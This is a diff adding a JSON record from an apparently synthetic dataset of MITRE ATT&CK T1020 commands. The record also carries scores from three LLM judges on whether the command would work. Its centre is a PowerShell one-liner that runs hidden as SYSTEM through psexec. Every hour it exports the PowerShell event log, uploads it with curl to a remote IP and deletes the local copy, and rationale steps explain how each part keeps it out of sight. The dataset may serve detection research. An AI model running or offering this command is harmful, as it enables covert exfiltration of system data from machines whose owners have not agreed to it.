@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; while ($true){ $bundle=Join-Path $env:TEMP ('evt-' + (Get-Date -Format yyyyMMddHHmmss) + '.evtx'); wevtutil epl 'Microsoft-Windows-PowerShell/Operational' $bundle > $null 2>&1; curl -s -X POST --data-binary @`\"$bundle`\" https://198.51.100.60/upload > $null 2>&1; if ($LASTEXITCODE -eq 0){ Remove-Item -Force $bundle }; Start-Sleep 3600 }\"",
+  "explanation": "Periodically exports the PowerShell Operational event log and exfiltrates it via HTTP POST using curl in silent mode, cleaning up the bundle after successful transfer.",
+  "rationale_steps": [
+    "Run as SYSTEM and detached to remain hidden using PSExec.",
+    "Export a relevant event log to a temporary file.",
+    "Upload the log via HTTP POST with curl while suppressing output.",
+    "Delete the exported file upon success to avoid re-sending.",
+    "Execute hourly in a loop for automated, ongoing exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-b810a449",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and escaping with valid PsExec and PowerShell flags, proper separators, and correct redirections make it parseable as written.",
+        "semantic_score": 3,
+        "semantic_justification": "It automates periodic log export and HTTP POST exfiltration, but will likely fail because PowerShell's curl alias (not curl.exe) breaks the arguments, the target IP is a documentation-only range, and it implicitly requires elevated privilege despite stating none.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T04:51:08.864770Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper PowerShell syntax, correct flag usage, and appropriate escape sequences for nested commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by using PsExec to launch a hidden PowerShell process that periodically exports PowerShell event logs and exfiltrates them via HTTP POST to a remote server on an hourly schedule with cleanup logic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:51:12.733884Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct `psexec` and PowerShell syntax, including proper escaping of arguments for the nested `curl` command.",
+        "semantic_score": 1,
+        "semantic_justification": "The command attempts to use `psexec -s` to run as SYSTEM, which directly contradicts the stated 'Privilege: None' for the executing user, making the entire command inoperable and unable to achieve its claimed intent of automated exfiltration under the given conditions.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T04:51:54.943443Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
